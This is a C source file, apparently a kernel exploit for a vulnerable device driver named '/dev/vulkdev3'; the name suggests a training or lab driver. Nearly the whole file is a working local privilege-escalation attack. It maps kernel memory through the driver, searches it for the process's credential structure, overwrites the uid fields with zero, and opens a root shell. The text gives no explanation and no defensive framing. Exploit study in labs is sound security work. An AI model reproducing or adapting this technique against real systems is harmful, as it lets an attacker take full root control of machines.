#define _GNU_SOURCE
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

#define MMAP_START  0x42424000
#define MMAP_SIZE   0x7ffe0000
#define MMAP_OFFSET 0x00000000

int kernel_mmap2(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	unsigned long addr;
	unsigned long start;

	uid = getuid();
	printf("uid = %d\n", uid);
	if (uid == 0) {
		printf("already root, exit\n");
		exit(0);
	}
	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	addr = (unsigned long)mmap((void *)MMAP_START, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, MMAP_OFFSET);
	if ((void *)addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	start = (unsigned long)addr;
	printf("mmap addr: %lx\n", start);


	unsigned int num = 0;
	unsigned long *p = (unsigned long *)start;
	while ((unsigned long)p < start + MMAP_SIZE - 0x40) {
		unsigned int idx = 0;
		if (p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid &&
			p[idx++] == uid) {
			printf("find cred structure, ptr=%p, num=%d\n", p, ++num);

			idx = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			p[idx++] = 0;
			
			if (getuid() == 0) {
				break;
			} else {
				idx = 0;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
				p[idx++] = uid;
			}
		}
		p++;
	}
	printf("loop end\n");

	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}

